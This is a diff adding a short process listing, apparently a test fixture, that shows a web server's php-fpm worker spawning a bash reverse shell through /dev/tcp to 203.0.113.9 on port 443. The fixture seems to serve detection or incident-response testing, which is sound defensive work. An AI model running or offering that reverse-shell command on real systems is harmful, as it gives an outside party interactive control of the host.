@@ -1,0 +1,5 @@
+USER         PID  PPID COMMAND
+root           1     0 /sbin/init
+www-data    1200     1 php-fpm: pool www
+www-data    1201  1200 sh -c /bin/bash -i >& /dev/tcp/203.0.113.9/443 0>&1
+www-data    1202  1201 bash
